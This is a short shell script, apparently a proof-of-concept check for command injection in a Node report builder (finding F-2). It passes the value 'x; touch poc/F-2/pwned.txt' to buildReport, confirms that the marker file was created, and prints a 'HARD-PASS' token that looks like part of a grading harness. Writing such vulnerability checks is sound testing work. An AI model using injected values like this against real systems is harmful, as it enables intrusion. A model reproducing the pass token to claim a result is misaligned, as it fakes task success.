#!/bin/sh
set -e
cd "$(dirname "$0")/../.."
node -e "const {buildReport}=require('./src/reports.js'); buildReport('x; touch poc/F-2/pwned.txt')"
test -f poc/F-2/pwned.txt
echo "exploited: pwned.txt created"
echo "HARD-PASS af61f26cacccdc8d1367148af2c70a340f76f9d4689fb9632ba39fb8a9e135b5"
